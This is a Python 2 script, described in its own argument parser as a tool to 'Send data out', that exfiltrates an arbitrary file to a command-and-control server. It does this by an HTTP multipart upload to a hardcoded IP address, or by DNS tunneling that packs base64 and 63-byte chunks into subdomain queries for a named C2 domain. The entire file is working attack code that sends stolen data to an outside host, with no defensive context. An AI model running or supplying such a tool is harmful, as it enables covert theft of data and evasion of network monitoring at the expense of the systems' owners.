import argparse
import base64
import json
import mimetypes
import socket
import string
import struct
import sys
import random

HOST = "10.22.0.87"
HTTP_PORT = 80
DNS_PORT = 53
POST_URL = 'http://10.22.0.87/upload'
CRLF = "\r\n\r\n"


def decode_header(packet):
    """
        Decodes the header of a packet so we can see if it
        allows for recursion or not

        :param packet: the reponse packet recieved

        :return: true if recursion, false if not
    """
    query_id, flags, query_count, ans_count, auth_count, add_count = struct.unpack('!HHHHHH', packet[:12])
    qr = flags >> 15
    opcode = (flags >> 11) & 0xf
    aa = (flags >> 10) & 0x1
    tc = (flags >> 9) & 0x1
    rd = (flags >> 8) & 0x1
    ra = (flags >> 7) & 0x1
    z = (flags >> 6) & 0x1
    ad = (flags >> 5) & 0x1
    cd = (flags >> 4) & 0x1
    rcode = flags & 0xf

    if ra:
        return True
    else:
        return False


def random_string(length):
    """
        Creates a randoms string for our HTTP packet seperator

        :param length: the length of the string to make

        :returns: the randomly generated string
    """
    return ''.join(random.choice(string.letters) for _ in range(length + 1))


def get_content_type(filename):
    """
        Trys to guess the type of file being sent, will default
        to regular binary octet-stream

        :param filename: the file to guess

        :returns: the type of file it thinks it is
    """
    return mimetypes.guess_type(filename)[0] or 'application/octet-stream'


def load_file(filename):
    """
        Load file into binary string to send

        :param filename: the name of the file to load
    """
    packet = ""
    with open(filename, 'rb') as f:
        byte = f.read(1)
        while byte:
            packet += struct.pack("c", byte)
            byte = f.read(1)

    return packet


def fragment_data(data):
    """
        Function to fragment data into a easily accessible dictionary
        of 63 byte chunks

        :param data: the data to be fragmented

        :return frag_list: the fragmented data in a list
    """
    n = 63
    return [data[i:i+n] for i in range(0, len(data), n)]


def encode_file(packet, filename, boundary):
    """
        Encodes our packet to fit the HTTP file upload spec

        :param packet: the binary file data to be sent
        :param filename: the name of the file being uploaded
        :param boundary: the boundary string to seperate data
        :returns: the encoded packet
    """
    content = get_content_type(filename)
    encoded = [
                "--{}".format(boundary),
                "Content-Disposition: form-data; name=\"file\"; filename=\"{}\"".format(filename),
                "Content-Type: {}".format(content),
                "",
                packet,
                "--{}--".format(boundary)
            ]

    encoded = '\r\n'.join(encoded)
    return encoded


def send_http(packet, filename):
    """
        Send the data to our server

        :param packet: the data to be send
        :param filename: the name of the file being sent
    """
    boundary = random_string(30)
    payload = encode_file(packet, filename, boundary)
    request = "POST {} HTTP/1.1\r\n" \
              "Content-Type: multipart/form-data; boundary={}\r\n" \
              "Content-Length: {}\r\n" \
              "Host: {}\r\n" \
              "Connection: close{}{}".format(POST_URL, boundary, len(payload), HOST, CRLF, payload)

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        sock.connect((HOST, HTTP_PORT))
        sock.send(request)
    except socket.error, Exception:
        raise socker.error

    data_recv = ""
    while True:
        recv = sock.recv(1024)
        if not recv:
            break
        data_recv += recv

    sock.shutdown(1)
    sock.close()


def send_dns(data, c2_addr, file_name):
    """
        Send the data to our server

        :param data: the data to be sent
        :param c2_addr: the address of our c2 server
        :param file_name: the name of the file to send
    """
    # TODO - add check for iteration
    frag_list = fragment_data(data)
    b64_name = base64.b64encode(file_name) + '.file'  # signifies beginning of transfer
    data_list = [b64_name] + frag_list              # list of all our data to transfer
    data_list.append('end')                        # signifies end of transfer
    for key in data_list:
        packet = ""
        packet = struct.pack("!H", 13567) # Q ID
        packet += struct.pack("!H", 320) # Flags
        packet += struct.pack("!H", 1) # Questions
        packet += struct.pack("!H", 0) # Answers
        packet += struct.pack("!H", 0) # Authorities
        packet += struct.pack("!H", 0) # Additional
        real_domain = "{}.{}".format(key, c2_addr)
        #print "Sending: {}".format(real_domain)
        for part in real_domain.split('.'):
            packet += struct.pack("B", len(part)) # Store length of name
            packet += ''.join(struct.pack("c", byte) for byte in bytes(part)) # Loop & store name
        packet += struct.pack("B", 0) # Terminate name
        packet += struct.pack("!H", 1)  # Q A Type
        packet += struct.pack("!H", 1) # Q Class

        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(20)
        try:
            sock.sendto(bytes(packet), (HOST, DNS_PORT))
            sock.close()
        except socket.error, Exception:
            raise socket.error


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Send data out")
    parser.add_argument('-n', help='The name of the file to send', dest='filename', required=True)
    parser.add_argument('-p', help='The protocol to use (HTTP | DNS)', dest='protocol',
                        default='DNS')
    args = parser.parse_args()
    domain = "doshmajhan.com"
    exfil_data = None

    filename = args.filename
    protocol = args.protocol
    exfil_data = load_file(filename)
    filename = filename.replace('/', '')       # makes our life easier on the backend

    if protocol.lower() == "http":
        try:
            send_http(exfil_data, filename)
        except socket.error:
            raise Exception("HTTP seems to be failing, try a different protocol")
    else:
        try:
            send_dns(exfil_data, domain, filename)
        except socket.error:
            raise Exception("DNS seems to be failing, try a different protocol")

